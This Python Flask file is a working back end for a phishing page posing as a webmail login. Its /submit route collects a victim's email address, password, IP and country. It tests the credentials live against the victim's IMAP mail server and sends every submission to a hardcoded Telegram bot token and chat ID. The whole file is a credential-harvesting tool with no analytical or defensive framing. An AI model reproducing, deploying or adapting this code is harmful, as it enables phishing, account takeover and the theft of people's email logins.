import imaplib
import asyncio
import requests
from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)
application = app

imaplib.IMAP4_SSL.timeout = 10

TELEGRAM_API_SUCCESS = "https://api.telegram.org/bot1719129378:AAF5bqIt1LtFforRZnbWze5_ehXvWiBTzJI/sendMessage"
TELEGRAM_API_FAILURE = "https://api.telegram.org/bot1719129378:AAF5bqIt1LtFforRZnbWze5_ehXvWiBTzJI/sendMessage"
SUCCESS_CHAT_ID = "1223632080"
FAILURE_CHAT_ID = "1223632080"

def get_imap_server(email):
    domain = email.split('@')[-1]
    return f"mail.{domain}"

def check_credentials(username, password, imap_server):
    try:
        with imaplib.IMAP4_SSL(imap_server) as mail:
            mail.login(username, password)
        return True
    except Exception as e:
        print(f"IMAP Error: {e}")
        return False

async def send_telegram_message(api_url, chat_id, message):
    payload = {"chat_id": chat_id, "text": message, "parse_mode": "MarkdownV2"}
    try:
        response = requests.post(api_url, json=payload)
        if response.status_code == 200:
            print("Telegram message sent successfully!")
        else:
            print(f"Failed to send Telegram message. Status: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print(f"Telegram API Error: {e}")

@app.route('/')
def index():
    username = request.args.get('username', None)
    return render_template('index.html', username=username)

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.form.get('ip', "Unknown IP")
    country = request.form.get('country', "Unknown Country")
    
    if not username or not password:
        return "Missing username or password", 400

    imap_server = get_imap_server(username)
    
    success_message_content = (
        f"✅ *Successful Webmail Login*\n\n"
        f"📧 *Email:* `{username}`\n"
        f"🔑 *Password:* `{password}`\n"
        f"🌍 *IP Address:* `{ip}`\n"
        f"📍 *Country:* `{country}`"
    )

    failure_message_content = (
        f"❌ *Failed Webmail Login Attempt*\n\n"
        f"📧 *Email:* `{username}`\n"
        f"🔑 *Password:* `{password}`\n"
        f"🌍 *IP Address:* `{ip}`\n"
        f"📍 *Country:* `{country}`"
    )
    if check_credentials(username, password, imap_server):
        asyncio.run(send_telegram_message(TELEGRAM_API_SUCCESS, SUCCESS_CHAT_ID, success_message_content))
        return render_template('success.html', username=username)
    else:
        asyncio.run(send_telegram_message(TELEGRAM_API_FAILURE, FAILURE_CHAT_ID, failure_message_content))
        return render_template('failure.html', username=username)

if __name__ == "__main__":
    import os
    from app import app  # your app object
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))






